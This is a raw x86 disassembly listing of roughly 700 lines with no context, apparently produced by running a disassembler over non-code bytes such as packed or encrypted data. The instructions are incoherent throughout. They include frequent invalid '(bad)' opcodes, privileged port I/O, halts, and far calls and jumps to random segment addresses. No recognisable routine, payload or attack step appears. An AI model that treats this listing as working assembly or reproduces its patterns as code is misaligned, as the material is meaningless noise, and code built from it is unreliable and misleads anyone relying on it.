  417eb2:	and    BYTE PTR [esp+eax*1+0x67],0xdc
  417eb7:	jne    0x417eae
  417eb9:	push   edx
  417eba:	pop    eax
  417ebb:	(bad)  
  417ebc:	xor    eax,0x5a6f4d89
  417ec1:	push   ebx
  417ec2:	stos   BYTE PTR es:[edi],al
  417ec3:	retf   0xf5f5
  417ec6:	dec    ecx
  417ec7:	mov    al,0xc
  417ec9:	mov    cl,0xf1
  417ecb:	xchg   edx,eax
  417ecc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ecd:	adc    ebx,DWORD PTR [ebx-0x39]
  417ed0:	jne    0x417ed0
  417ed2:	(bad)  
  417ed3:	xlat   BYTE PTR ds:[ebx]
  417ed4:	stos   DWORD PTR es:[edi],eax
  417ed5:	jp     0x417f37
  417ed7:	cmc    
  417ed8:	popf   
  417ed9:	call   0xa10f:0x785fae9a
  417ee0:	nop
  417ee1:	mov    ah,0x78
  417ee3:	test   eax,0x8ccf7a9e
  417ee8:	pop    eax
  417ee9:	lock dec edx
  417eeb:	pop    eax
  417eec:	add    al,0x59
  417eee:	jp     0x417f00
  417ef0:	adc    esi,esi
  417ef2:	stos   BYTE PTR es:[edi],al
  417ef3:	out    0x24,al
  417ef5:	xchg   ecx,eax
  417ef6:	sub    BYTE PTR [eax-0x6c151028],ch
  417efc:	fistp  WORD PTR [ecx-0x3e]
  417eff:	dec    edi
  417f00:	dec    edi
  417f01:	dec    esi
  417f02:	out    0x1,eax
  417f04:	fdivr  DWORD PTR [esi+ebx*2+0x5d70ae37]
  417f0b:	(bad)  
  417f0c:	push   cs
  417f0d:	ins    DWORD PTR es:[edi],dx
  417f0e:	daa    
  417f0f:	mov    ecx,0xc86aebab
  417f14:	fimul  WORD PTR [ebp-0x52da6e2d]
  417f1a:	scas   al,BYTE PTR es:[edi]
  417f1b:	xchg   edx,eax
  417f1c:	jle    0x417f4d
  417f1e:	inc    edx
  417f1f:	adc    ch,BYTE PTR [ebx]
  417f21:	cmp    eax,0xebcd857f
  417f26:	jecxz  0x417ef0
  417f28:	cwde   
  417f29:	cwde   
  417f2a:	sar    DWORD PTR [ecx-0x1490a08b],1
  417f30:	adc    eax,0x67fc3199
  417f35:	fmul   st(3),st
  417f37:	and    al,0xef
  417f39:	(bad)
  417f3d:	xor    DWORD PTR [eax],ebx
  417f3f:	int3   
  417f40:	add    eax,0x6b388d4f
  417f45:	es sub edx,0xeee5abbf
  417f4c:	jp     0x417f93
  417f4e:	scas   eax,DWORD PTR es:[edi]
  417f4f:	shl    DWORD PTR [edi-0x14],1
  417f52:	ins    DWORD PTR es:[edi],dx
  417f53:	pop    ss
  417f54:	and    BYTE PTR [ebx+0x6e],al
  417f57:	add    ah,BYTE PTR [esi+0x49ca5d09]
  417f5d:	pop    edx
  417f5e:	in     eax,0x47
  417f60:	rol    BYTE PTR [ebp+0x58f3745a],cl
  417f66:	sub    DWORD PTR [eax+0x3bfba829],esp
  417f6c:	(bad)
  417f6f:	jg     0x417f9d
  417f71:	xor    BYTE PTR [edx+ebx*8+0x15],cl
  417f75:	cmc    
  417f76:	scas   eax,DWORD PTR es:[edi]
  417f77:	mov    ebp,0x92190210
  417f7c:	or     BYTE PTR [edi+0x38],dl
  417f7f:	inc    edx
  417f80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f81:	inc    esp
  417f82:	mov    eax,ds:0x9587a136
  417f87:	(bad)  
  417f88:	pusha  
  417f89:	adc    al,0xd4
  417f8b:	xchg   ebp,eax
  417f8c:	adc    dl,BYTE PTR [edi]
  417f8e:	jge    0x417f61
  417f90:	pop    esi
  417f91:	das    
  417f92:	shl    DWORD PTR [ebx],0xd5
  417f95:	pop    eax
  417f96:	dec    ecx
  417f97:	jnp    0x417ff2
  417f99:	xchg   ecx,eax
  417f9a:	cli    
  417f9b:	inc    esp
  417f9c:	and    eax,0x65887f15
  417fa1:	mov    edi,DWORD PTR [ecx]
  417fa3:	pop    edx
  417fa4:	hlt    
  417fa5:	fsub   DWORD PTR [ecx+ecx*2+0x67]
  417fa9:	xchg   ecx,eax
  417faa:	xchg   edi,eax
  417fab:	adc    ah,BYTE PTR [eax+0x2283f2a2]
  417fb1:	outs   dx,BYTE PTR ds:[esi]
  417fb2:	clc    
  417fb3:	aaa    
  417fb4:	push   0xd22a8fa3
  417fb9:	mov    al,ds:0x7c29b593
  417fbe:	std    
  417fbf:	add    ebp,eax
  417fc1:	adc    eax,DWORD PTR [esi+edi*8]
  417fc4:	push   ds
  417fc5:	mov    ?,WORD PTR [edi-0x218468b8]
  417fcb:	test   BYTE PTR ds:0x96ceb519,bh
  417fd1:	es je  0x417f85
  417fd4:	xchg   BYTE PTR [ebx-0x65],cl
  417fd7:	mov    ebp,0xbdc27042
  417fdc:	pop    ecx
  417fdd:	outs   dx,DWORD PTR ds:[esi]
  417fde:	inc    edi
  417fdf:	daa    
  417fe0:	or     ebp,DWORD PTR [eax-0x4e]
  417fe3:	pop    ebp
  417fe4:	outs   dx,BYTE PTR ds:[esi]
  417fe5:	retf   0x5f36
  417fe8:	das    
  417fe9:	mov    bh,0xa2
  417feb:	sahf   
  417fec:	or     al,0xdd
  417fee:	pop    ss
  417fef:	ja     0x417fe0
  417ff1:	mov    eax,ds:0x712a2c23
  417ff6:	shr    BYTE PTR [edx+0x4d],0x2c
  417ffa:	shl    DWORD PTR fs:[ecx-0x7d],1
  417ffe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fff:	add    DWORD PTR [edx+0x3e],0xe
  418003:	xor    ah,BYTE PTR ds:0x54d56b2a
  418009:	pop    esp
  41800a:	test   DWORD PTR [edx-0x1e],esp
  41800d:	add    eax,0xdb7ef084
  418012:	pop    ebx
  418013:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418014:	add    al,ah
  418016:	mov    ah,0x89
  418018:	xchg   ecx,eax
  418019:	pop    ecx
  41801a:	call   FWORD PTR [ebx-0x4e9b4e55]
  418020:	out    0xdd,eax
  418022:	ficom  DWORD PTR [ecx+0x74]
  418025:	jb     0x41808f
  418027:	fcmovne st,st(0)
  418029:	push   ebx
  41802b:	xchg   edx,eax
  41802c:	setno  dh
  41802f:	popf   
  418030:	mov    DWORD PTR [edx+ecx*1+0x18],edx
  418034:	jo     0x41801a
  418036:	cwde   
  418037:	or     dl,BYTE PTR [edx]
  418039:	cmp    cl,dh
  41803b:	jmp    0x418018
  41803d:	cmp    DWORD PTR [ecx*2+0x334586af],esi
  418044:	mov    al,0x35
  418046:	push   esi
  418047:	inc    esi
  418048:	lods   eax,DWORD PTR ds:[esi]
  418049:	push   0x7d
  41804b:	add    eax,0xdedb9046
  418050:	add    al,0x2d
  418052:	cmp    BYTE PTR [eax-0x44],cl
  418055:	loop   0x418099
  418057:	mov    ch,0x8a
  418059:	sub    BYTE PTR [edx+0x731c9bd],ch
  41805f:	sbb    ebx,edi
  418061:	xor    al,0x58
  418063:	call   0x67ca:0x37588f4c
  41806a:	pop    esp
  41806b:	jg     0x4180b8
  41806d:	int    0xc2
  41806f:	mov    eax,ds:0x9a23c139
  418074:	(bad)  [esi+edx*2]
  418077:	rol    DWORD PTR [ecx],cl
  418079:	inc    ecx
  41807a:	div    BYTE PTR [ecx-0x720df278]
  418080:	or     edx,DWORD PTR [ebp-0x36]
  418083:	rcr    dh,1
  418085:	and    eax,DWORD PTR [edx+0x1fd33754]
  41808b:	js     0x418095
  41808d:	xor    edi,DWORD PTR [edx]
  41808f:	push   ebx
  418090:	jae    0x41806e
  418092:	mov    ecx,0x54a7f262
  418097:	mov    ds:0xa9c9128e,eax
  41809c:	sbb    al,0x4b
  41809e:	pop    esp
  41809f:	sbb    BYTE PTR [edi-0x5131dd48],0x57
  4180a6:	jge    0x41808e
  4180a8:	cmp    BYTE PTR [eax+0x38],0x5d
  4180ac:	and    cl,BYTE PTR [esi*4+0x4c6619ca]
  4180b3:	mov    bl,0x48
  4180b5:	pop    esp
  4180b6:	fisubr DWORD PTR [eax+0x23a543ad]
  4180bc:	cdq    
  4180bd:	clc    
  4180be:	rol    DWORD PTR ds:0x88f9afe,cl
  4180c4:	(bad)  
  4180c5:	(bad)  
  4180c6:	aam    0x45
  4180c8:	inc    DWORD PTR [eax-0x6f598d3e]
  4180ce:	sbb    BYTE PTR [ebx-0x6fe5403a],bh
  4180d4:	xor    BYTE PTR [edx+0xcb1a6b2],dl
  4180da:	ret    
  4180db:	not    BYTE PTR [edi]
  4180dd:	std    
  4180de:	push   eax
  4180df:	(bad)  
  4180e0:	loopne 0x4180c9
  4180e2:	and    dh,BYTE PTR [ebp+0x29]
  4180e5:	ds mov esi,0x48bbfe35
  4180eb:	adc    DWORD PTR [esi],edx
  4180ed:	iret   
  4180ee:	pop    eax
  4180ef:	out    0x3b,eax
  4180f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180f2:	jge    0x41810d
  4180f4:	into   
  4180f5:	and    DWORD PTR [esi],ebp
  4180f7:	sar    edi,1
  4180f9:	mov    dl,0xa8
  4180fb:	pop    ecx
  4180fc:	movups xmm2,XMMWORD PTR [ebx+0x64]
  418100:	lods   eax,DWORD PTR ds:[esi]
  418101:	dec    esp
  418102:	clc    
  418103:	aam    0xe4
  418105:	dec    eax
  418106:	lahf   
  418107:	cmp    eax,ebp
  418109:	cmp    bl,dh
  41810b:	imul   ecx,DWORD PTR [ebx-0x3f],0x51d676c2
  418112:	(bad)  
  418113:	outs   dx,DWORD PTR ds:[esi]
  418114:	jno    0x418129
  418116:	and    ah,0xa3
  418119:	xchg   edi,eax
  41811a:	call   0x89bc01f9
  41811f:	rcl    BYTE PTR [ebp-0x5f],cl
  418122:	fdiv   DWORD PTR [edi]
  418124:	outs   dx,BYTE PTR ds:[esi]
  418125:	mov    dh,0xc8
  418127:	out    dx,eax
  418128:	mov    ?,WORD PTR ds:[edx-0x45]
  41812c:	not    bh
  41812e:	(bad)  
  41812f:	jb     0x4181a6
  418131:	lods   al,BYTE PTR ds:[esi]
  418132:	mov    BYTE PTR [esi-0x5293090b],al
  418138:	adc    ch,al
  41813a:	ins    DWORD PTR es:[edi],dx
  41813b:	xor    bl,cl
  41813d:	psubw  mm3,QWORD PTR [ecx+0x6a]
  418141:	inc    esp
  418142:	jno    0x418151
  418144:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418145:	jecxz  0x418183
  418147:	gs dec ecx
  418149:	data16 and al,0x2e
  41814c:	mov    ebp,0x238330ab
  418151:	int3   
  418152:	test   ebp,ebp
  418154:	mov    bh,0x49
  418156:	fwait
  418157:	std    
  418158:	gs sti 
  41815a:	(bad)  
  41815b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41815c:	fistp  QWORD PTR [ecx-0x75]
  41815f:	sbb    BYTE PTR ds:0x6c4fd6e8,dh
  418165:	mov    BYTE PTR [ebp-0x13],ch
  418168:	or     al,0xbf
  41816a:	xchg   edx,eax
  41816b:	dec    ebp
  41816c:	div    esi
  41816e:	lahf   
  41816f:	lds    eax,FWORD PTR [esi+eax*4-0x3c670924]
  418176:	sub    eax,0xe4316a5b
  41817b:	ja     0x4181dd
  41817d:	inc    ebp
  41817e:	sbb    ecx,ebx
  418180:	dec    edx
  418181:	adc    ebx,DWORD PTR [esi+eiz*8-0x1e]
  418185:	and    ecx,ebx
  418187:	mov    bh,BYTE PTR [eax+0x23]
  41818a:	(bad)  
  41818b:	or     BYTE PTR [eax+eiz*1],dh
  41818e:	fisttp QWORD PTR [esi]
  418190:	add    al,0x10
  418192:	mov    WORD PTR ds:0xe5c65797,fs
  418198:	xchg   esi,eax
  418199:	add    esp,eax
  41819b:	sub    al,0x57
  41819d:	lock mov ah,0xe8
  4181a0:	lods   eax,DWORD PTR ds:[esi]
  4181a1:	pop    ds
  4181a2:	cmp    esi,DWORD PTR [esi-0x5d]
  4181a5:	iret   
  4181a6:	cmp    BYTE PTR [ecx-0x63],dh
  4181a9:	hlt    
  4181aa:	clc    
  4181ab:	popf   
  4181ac:	mov    ds:0xbae5851,al
  4181b1:	popf   
  4181b2:	(bad)  
  4181b3:	xor    DWORD PTR [edi],eax
  4181b5:	dec    ebp
  4181b6:	retf   
  4181b7:	ins    BYTE PTR es:[edi],dx
  4181b8:	icebp  
  4181b9:	das    
  4181ba:	jmp    DWORD PTR [ebx+0x6ab9d6cf]
  4181c0:	dec    DWORD PTR [ecx+0x16]
  4181c3:	shl    DWORD PTR [edi-0x3be2215],1
  4181c9:	pop    edi
  4181ca:	stos   DWORD PTR es:[edi],eax
  4181cb:	hlt    
  4181cc:	adc    eax,DWORD PTR [ebx]
  4181ce:	fcom   DWORD PTR [edi]
  4181d0:	xchg   esp,eax
  4181d1:	add    DWORD PTR [edx+0x5],edi
  4181d4:	or     al,BYTE PTR [ecx-0x6b]
  4181d7:	inc    edi
  4181d8:	xor    al,0xd0
  4181da:	mov    bh,0xf7
  4181dc:	imul   edx,DWORD PTR [esi-0x57],0x44391024
  4181e3:	shl    DWORD PTR [ebx-0x3826438c],0xd9
  4181ea:	jmp    0xd0487424
  4181ef:	mov    edi,0xfa54b889
  4181f4:	or     eax,0xf501dd5c
  4181f9:	cli    
  4181fa:	ds xor eax,0x98252293
  418200:	push   ebp
  418201:	sbb    eax,0xea1c4e9f
  418206:	and    al,0xce
  418208:	pop    ebp
  418209:	xor    esi,esi
  41820b:	and    al,0xc0
  41820d:	and    DWORD PTR [ecx-0x3bc3b505],esp
  418213:	lock repz and bl,BYTE PTR [ecx]
  418217:	sbb    BYTE PTR [eax+0x6bc1cd6c],bl
  41821d:	out    0xf4,eax
  41821f:	mov    es,WORD PTR [edi+0x5884e24d]
  418225:	push   esi
  418226:	(bad)  
  418227:	sti    
  418228:	ret    0x7d4f
  41822b:	scas   al,BYTE PTR es:[edi]
  41822c:	sub    BYTE PTR [edx-0x58],0x71
  418230:	les    esi,FWORD PTR [eax]
  418232:	push   cs
  418233:	jmp    0x4182a6
  418235:	sub    DWORD PTR [esi-0x660d22a4],0x26
  41823c:	xlat   BYTE PTR ds:[ebx]
  41823d:	adc    al,BYTE PTR ds:0x3102f59f
  418243:	cmp    esp,eax
  418245:	xchg   ebp,eax
  418246:	fldenv [ebx+ecx*2]
  418249:	jge    0x418242
  41824b:	stos   DWORD PTR es:[edi],eax
  41824c:	shl    edx,cl
  41824e:	inc    esi
  41824f:	fnstsw WORD PTR [esi]
  418251:	mov    ebx,0x22761413
  418256:	xlat   BYTE PTR ds:[ebx]
  418257:	fldenv [ebx+0x45]
  41825a:	mov    bh,0x70
  41825c:	push   eax
  41825d:	mov    eax,ds:0xbf1de379
  418262:	xor    al,0xd2
  418264:	out    0xfa,al
  418266:	mov    ebx,0x8e7212fc
  41826b:	enter  0xf440,0xb6
  41826f:	sar    DWORD PTR [eax+ecx*2-0x4b],1
  418273:	push   edx
  418274:	inc    ebx
  418275:	jo     0x41822b
  418277:	fwait
  418278:	aaa    
  418279:	jno    0x4182aa
  41827b:	(bad)  
  41827c:	pop    edi
  41827d:	mov    edx,0x8529aa1c
  418282:	mov    eax,0xd8b46bc6
  418287:	dec    edx
  418288:	xchg   edi,eax
  418289:	sub    ebx,esi
  41828b:	or     DWORD PTR [ebp+0x45aa76a9],edx
  418291:	out    dx,al
  418292:	mov    BYTE PTR [ecx],ch
  418294:	xor    esi,ebx
  418296:	dec    ebp
  418297:	je     0x418277
  418299:	test   DWORD PTR [esi+0x5791c7cc],0xfe873bd9
  4182a3:	enter  0x46ef,0xc1
  4182a7:	fnstsw WORD PTR [ecx+0x57db0143]
  4182ad:	test   DWORD PTR [edx+0x7a],edx
  4182b0:	rol    cl,1
  4182b2:	lock adc ah,cl
  4182b5:	(bad)  
  4182b6:	hlt    
  4182b7:	pop    ecx
  4182b8:	jnp    0x418275
  4182ba:	ret    0x7299
  4182bd:	lds    ecx,FWORD PTR [edi]
  4182bf:	xchg   ecx,edi
  4182c1:	jmp    0x27c3:0x6aa40c38
  4182c8:	mov    ebx,0x2831a4fd
  4182cd:	in     al,0x6b
  4182cf:	pop    edi
  4182d0:	mov    ebx,0x32392778
  4182d5:	mov    ebp,0xc1f903f4
  4182da:	cmc    
  4182db:	xor    ch,BYTE PTR [esi+0x4a11c052]
  4182e1:	push   ebp
  4182e2:	pushf  
  4182e3:	test   ebx,0x19595f10
  4182e9:	mov    dh,0x1f
  4182eb:	nop
  4182ec:	fwait
  4182ed:	xor    al,0x71
  4182ef:	mov    eax,0x65caec06
  4182f4:	xchg   ebx,eax
  4182f5:	ins    DWORD PTR es:[edi],dx
  4182f6:	mov    BYTE PTR [esi+ebx*1+0x13],dl
  4182fa:	push   esp
  4182fb:	mov    fs,WORD PTR [ebp-0x2a050370]
  418301:	gs add dh,bh
  418304:	xchg   ebp,eax
  418305:	adc    DWORD PTR [ebx-0x7011505c],ebp
  41830b:	pushf  
  41830c:	push   eax
  41830d:	retf   
  41830e:	inc    ebp
  41830f:	jp     0x418324
  418311:	add    bh,BYTE PTR [ecx+0x3d]
  418314:	ds jnp 0x4182dd
  418317:	xchg   esp,eax
  418318:	js     0x41830f
  41831a:	les    edi,FWORD PTR [eax+0x70]
  41831d:	mov    esi,0x57e0d9d6
  418322:	ss pop ebp
  418324:	xchg   esp,eax
  418325:	aas    
  418326:	cld    
  418327:	jl     0x4182b3
  418329:	mov    ebx,DWORD PTR [ecx+0x190725e0]
  41832f:	scas   eax,DWORD PTR es:[edi]
  418330:	jecxz  0x4182d4
  418332:	call   0xde9c:0xb6fa0917
  418339:	psubusw mm3,QWORD PTR [ebx-0x1b]
  41833d:	jbe    0x418370
  41833f:	ins    DWORD PTR es:[edi],dx
  418340:	mov    bl,0x59
  418342:	movhps xmm7,QWORD PTR [edi+0x532b2c03]
  418349:	test   al,0xe5
  41834b:	rcr    BYTE PTR [esi],0x0
  41834e:	popf   
  41834f:	ja     0x41839f
  418351:	adc    bh,BYTE PTR [esi-0xb]
  418354:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418355:	pop    eax
  418356:	shr    DWORD PTR [esp+ecx*4+0x3aea4bb9],cl
  41835d:	add    eax,0xdcce659
  418362:	and    DWORD PTR [ebx+edx*4+0x4f],ecx
  418366:	sbb    eax,0x6237f582
  41836b:	lods   al,BYTE PTR ds:[esi]
  41836c:	clc    
  41836d:	mov    ch,0xad
  41836f:	repz in al,0xe6
  418372:	or     al,0xa3
  418374:	sbb    eax,DWORD PTR [ebx-0x3f01b3af]
  41837a:	jecxz  0x41835d
  41837c:	xchg   ecx,eax
  41837d:	jg     0x52490de
  418383:	adc    eax,0xe4d82b1b
  418388:	pop    esi
  418389:	std    
  41838a:	push   cs
  41838b:	fdiv   QWORD PTR [edi]
  41838d:	stc    
  41838e:	clc    
  41838f:	frstor [ebx+0x18da612]
  418395:	cmp    BYTE PTR [ebp+edx*2-0x4d763cb7],dh
  41839c:	lock adc bh,dh
  41839f:	inc    eax
  4183a0:	xchg   edi,eax
  4183a1:	cdq    
  4183a2:	dec    ebp
  4183a3:	je     0x41832e
  4183a5:	imul   edx,DWORD PTR gs:[ebp-0x27bfb87c],0xfffffff8
  4183ad:	xchg   esi,eax
  4183ae:	add    esi,DWORD PTR [edx+ecx*2-0x48b84e42]
  4183b5:	push   esp
  4183b6:	jae    0x418429
  4183b8:	sti    
  4183b9:	add    eax,0xa6aef705
  4183be:	call   0x5a0f:0x833ffeb8
  4183c5:	lock jecxz 0x4183e7
  4183c8:	adc    eax,0xa924f4a9
  4183cd:	test   eax,0xc98c1632
  4183d2:	sub    bl,ch
  4183d4:	aam    0x9
  4183d6:	ss adc ch,bh
  4183d9:	inc    ebx
  4183da:	pop    ds
  4183db:	scas   al,BYTE PTR es:[edi]
  4183dc:	shl    ebp,1
  4183de:	stc    
  4183df:	rol    DWORD PTR ds:0x907b30e4,1
  4183e5:	adc    DWORD PTR fs:[ebp-0x6c3400d6],0x1d48f09a
  4183f0:	jb     0x418425
  4183f2:	stc    
  4183f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183f4:	addr16 cmc 
  4183f6:	sbb    edi,eax
  4183f8:	popa   
  4183f9:	sbb    ecx,DWORD PTR [eax-0x7]
  4183fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183fd:	mov    eax,0xc4541ad7
  418402:	push   ebp
  418403:	jb     0x418450
  418405:	popf   
  418406:	jle    0x4183c7
  418408:	inc    DWORD PTR [edi-0x9]
  41840b:	pop    ecx
  41840c:	das    
  41840d:	add    esp,ecx
  41840f:	in     eax,0xfb
  418411:	push   ds
  418412:	xchg   edi,eax
  418413:	push   ds
  418414:	jo     0x418451
  418416:	ret    0xfd1d
  418419:	aam    0xb1
  41841b:	je     0x418427
  41841d:	adc    ah,BYTE PTR [ecx-0x7ad1f714]
  418423:	call   0x4943:0x4100c7e5
  41842a:	call   0x2da917ed
  41842f:	mov    al,0x3f
  418431:	(bad)  [ecx+0x2da3cc36]
  418437:	sbb    DWORD PTR [esi+0x51],edx
  41843a:	mov    ebp,0x15f65e49
  41843f:	add    ah,BYTE PTR [edx+esi*2]
  418442:	mov    ds:0xf8b154de,eax
  418447:	(bad)  
  418448:	sub    BYTE PTR [edx+0x68],dh
  41844b:	mov    esi,0xbf06a320
  418450:	push   ebx
  418451:	inc    ebx
  418452:	shl    DWORD PTR [edx+0x2bbe932b],1
  418458:	adc    eax,0xfc262f07
  41845d:	or     al,0xb1
  41845f:	sti    
  418460:	sbb    BYTE PTR [edx+0x57],ch
  418463:	mov    esi,?
  418465:	pop    ds
  418466:	in     eax,dx
  418467:	pop    ecx
  418468:	stos   DWORD PTR es:[edi],eax
  418469:	fisttp WORD PTR [ecx]
  41846b:	clc    
  41846c:	adc    eax,0xedcda8d8
  418471:	pop    edx
  418472:	jg     0x4184f2
  418474:	pop    ss
  418475:	iret   
  418476:	outs   dx,DWORD PTR ds:[esi]
  418477:	data16 mov ch,0x57
  41847a:	jle    0x41842e
  41847c:	sbb    dh,BYTE PTR [ebx-0x125ad196]
  418482:	jnp    0x4184f5
  418484:	imul   eax,DWORD PTR [eax-0x6],0x7ab0518d
  41848b:	jo     0x418419
  41848d:	neg    BYTE PTR [esi+0x10]
  418490:	xor    ebp,DWORD PTR [ecx+0x46]
  418493:	repnz repz xor bh,BYTE PTR ds:0xadc0e4
  41849b:	adc    ebp,esp
  41849d:	leave  
  41849e:	pop    eax
  41849f:	test   eax,0xb986567
  4184a4:	popa   
  4184a5:	sbb    ah,BYTE PTR [edi]
  4184a7:	sub    dl,BYTE PTR [ecx]
  4184a9:	data16 jp 0x4184b0
  4184ac:	adc    ch,ch
  4184ae:	mov    bl,0xe5
  4184b0:	cwde   
  4184b1:	jns    0x4184fe
  4184b3:	xchg   edi,eax
  4184b4:	sar    DWORD PTR ds:0x9fcc0df,0xca
  4184bb:	mov    ch,BYTE PTR [ebx]
  4184bd:	dec    esi
  4184be:	dec    ch
  4184c0:	xchg   ecx,eax
  4184c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184c2:	sti    
  4184c3:	(bad)  
  4184c4:	imul   edx,DWORD PTR [ebx+0x3b],0x26594d15
  4184cb:	dec    al
  4184cd:	test   eax,0xde35a55
  4184d2:	sub    eax,0x170d2d13
  4184d7:	mov    cs,WORD PTR gs:[edx]
  4184da:	mov    esi,0xca3e5085
  4184df:	xchg   edi,eax
  4184e0:	jmp    0x4184b6
  4184e2:	mov    al,ds:0x2a45c762
  4184e7:	sbb    BYTE PTR [ebx-0xda5bffe],al
  4184ed:	sahf   
  4184ee:	mov    eax,esi
  4184f0:	mov    esp,0xe07c4a8a
  4184f5:	pop    ebp
  4184f6:	fbld   TBYTE PTR [edx]
  4184f8:	repz xor esp,eax
  4184fb:	adc    DWORD PTR [ebx-0x18bda1a1],edi
  418501:	daa    
  418502:	lock outs dx,BYTE PTR ds:[esi]
  418504:	loop   0x418505
  418506:	out    0xed,eax
  418508:	cwde   
  418509:	lods   al,BYTE PTR ds:[esi]
  41850a:	les    esp,FWORD PTR [eax+edi*4]
  41850d:	jo     0x4184a7
  41850f:	mov    ecx,DWORD PTR [esi+0x30197b6a]
  418515:	outs   dx,DWORD PTR ds:[esi]
  418516:	enter  0xc42f,0x93
  41851a:	add    BYTE PTR [esi-0x60f8a537],dl
  418520:	adc    al,0x93
  418522:	sbb    edi,edi
  418524:	or     cl,BYTE PTR [ebx+0x6b85a4ca]
  41852a:	jg     0x41856a
  41852c:	pop    ecx
  41852d:	dec    edx
  41852e:	sub    BYTE PTR [eax+0x58581632],0x27
  418535:	pop    ecx
  418536:	lds    esi,FWORD PTR [ebx]
  418538:	and    edi,DWORD PTR [ebx+0x3ed3ca14]
  41853e:	and    BYTE PTR [bx+si+0x3c49],dl
  418543:	dec    ebx
  418544:	push   es
  418545:	sahf   
  418546:	fldenv [ecx-0x37]
  418549:	in     eax,0xac
  41854b:	clc    
  41854c:	mov    ebx,DWORD PTR [eax+0x18bbef11]
  418552:	loope  0x4185c0
  418554:	pop    ds
  418555:	pop    esp
  418556:	les    ebp,FWORD PTR [ebx+0x687f905c]
  41855c:	popf   
  41855d:	mov    al,0x28
  41855f:	cld    
  418560:	dec    esi
  418561:	in     al,dx
  418562:	pop    edx
  418563:	imul   esp,DWORD PTR ds:0xc07052f5,0x53
  41856a:	aas    
  41856b:	into   
  41856c:	inc    ebx
  41856d:	and    al,0x9b
  41856f:	dec    esp
  418570:	fcomi  st,st(0)
  418572:	repnz imul ebx,DWORD PTR [eax+0x45adb7a7],0xffffffad
  41857a:	mov    esp,0xb2ae53fd
  41857f:	out    0x6e,eax
  418581:	push   cs
  418582:	ret    
  418583:	xor    cl,BYTE PTR [edx-0x5]
  418586:	ficom  WORD PTR [edx+eiz*2-0x5b]
  41858a:	enter  0xefd0,0xdb
  41858e:	pusha  
  41858f:	fnstcw WORD PTR [eax+0x37]
  418592:	sub    BYTE PTR [ebx+0x7cf80b87],0xa0
  418599:	(bad)  
  41859b:	adc    al,BYTE PTR [eax+0x10]
  41859e:	test   al,0x8
  4185a0:	inc    ebx
  4185a1:	push   ds
  4185a2:	loopne 0x418544
  4185a4:	out    0xae,al
  4185a6:	scas   eax,DWORD PTR es:[edi]
  4185a7:	shl    DWORD PTR [edi],cl
  4185a9:	sub    al,0x9c
  4185ab:	in     al,0x4a
  4185ad:	xor    dl,BYTE PTR [edx-0xb836fa]
  4185b3:	imul   esi
  4185b5:	push   ds
  4185b6:	callw  0xb432
  4185ba:	mov    edi,0x13c633cf
  4185bf:	int    0xd
  4185c1:	outs   dx,DWORD PTR ds:[esi]
  4185c2:	adc    al,cl
  4185c4:	int3   
  4185c5:	shl    edi,1
  4185c7:	mov    ebx,0x97e73a9
  4185cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185cd:	in     eax,0x1e
  4185cf:	pop    es
  4185d0:	sub    DWORD PTR [esi+0x220ef47],ebx
  4185d6:	pop    ecx
  4185d7:	loop   0x4185ce
  4185d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185da:	fistp  WORD PTR [edi-0x2b]
  4185dd:	loopne 0x41856d
  4185df:	aaa    
  4185e0:	add    al,0xf2
  4185e2:	scas   al,BYTE PTR es:[edi]
  4185e3:	inc    esp
  4185e4:	mov    dh,0xcc
  4185e6:	or     BYTE PTR [esp+edx*8-0x76],al
  4185ea:	and    edi,DWORD PTR [esi-0xb]
  4185ed:	inc    esi
  4185ee:	scas   eax,DWORD PTR es:[edi]
  4185ef:	and    BYTE PTR [edi+0x19],ah
  4185f2:	mov    bh,0x7c
  4185f4:	lea    ecx,[esp+edi*2-0x102d0353]
  4185fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185fc:	pop    ds
  4185fd:	cmc    
  4185fe:	push   esp
  4185ff:	pop    esp
  418600:	ret    
  418601:	leave  
  418602:	(bad)  
  418603:	aam    0x91
  418605:	test   DWORD PTR [eax-0xb],ecx
  418608:	lds    edx,FWORD PTR [esi]
  41860a:	xchg   ecx,eax
  41860b:	addr16 ret 0x2868
  41860f:	push   ebp
  418610:	fnstsw WORD PTR [ebx-0x70015d73]
  418616:	adc    al,0x67
  418618:	or     edi,DWORD PTR [esi-0x70]
  41861b:	aaa    
  41861c:	mov    esp,DWORD PTR [eax]
  41861e:	jecxz  0x418682
  418620:	mov    dh,0x68
  418622:	clc    
  418623:	pop    ebx
  418624:	or     al,0xbc
  418626:	dec    ecx
  418627:	push   ss
  418628:	mov    eax,0xb313fc6d
  41862d:	xchg   ebp,eax
  41862e:	mov    ?,WORD PTR [eax]
  418630:	int    0xd6
  418632:	ins    DWORD PTR es:[edi],dx
  418633:	jle    0x418634
  418635:	mov    fs:0x12a68257,eax
  41863b:	and    eax,0x20286943
  418640:	sub    DWORD PTR [eax],edx
  418642:	add    al,BYTE PTR [ecx+0x8]
  418645:	jb     0x41866b
  418647:	xchg   ebx,eax
  418648:	mov    DWORD PTR [edi+esi*8-0x7a6b0288],ebp
  41864f:	jb     0x418697
  418651:	jbe    0x41865a
  418653:	mov    edx,0x8ee00736
  418658:	loope  0x41869d
  41865a:	push   edi
  41865b:	loop   0x4186ca
  41865d:	repz xchg esi,eax
  41865f:	push   ss
  418660:	or     esi,ecx
  418662:	imul   edi,ecx,0xb54620
  418668:	ja     0x4185ed
  41866a:	cmp    ecx,DWORD PTR fs:[si+0x1a5]
  418670:	ins    BYTE PTR es:[edi],dx
  418671:	bound  esp,QWORD PTR [edi+esi*8]
  418674:	std    
  418675:	or     al,BYTE PTR ds:0x4a906840
  41867b:	rol    BYTE PTR [esi-0x365cb1f4],1
  418681:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
